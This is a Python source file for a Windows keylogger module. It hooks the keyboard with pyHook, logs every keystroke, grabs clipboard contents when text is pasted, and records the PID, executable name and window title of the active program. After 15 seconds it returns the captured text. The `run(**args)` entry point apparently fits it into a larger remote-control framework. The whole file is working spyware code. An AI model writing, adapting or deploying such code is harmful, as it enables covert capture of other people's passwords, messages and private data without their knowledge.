from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import time

start = time.time()
PERIOD_OF_TIME = 15

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
data = ""


def get_current_process():

    global data

    hwnd = user32.GetForegroundWindow()

    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    process_id = "%d" % pid.value

    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    #print("[*] In keyLog module")
    #print("[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value))
    data += "[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)



def KeyStroke(event):

    global current_window, data

    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:
        #print(chr(event.Ascii))
        data += chr(event.Ascii)
    else:

        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            #print("[PASTE] - %s" % pasted_value)
            data += ("[PASTE] - %s" % pasted_value)
        else:
            #print("[%s]" % event.Key)
            data += ("[%s]" % event.Key)

    return True

def run(**args):

    global data

    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

    kl.HookKeyboard()

    while True:

        pythoncom.PumpWaitingMessages()
        if time.time() > start + PERIOD_OF_TIME :
            print(str(data))
            return str(data)
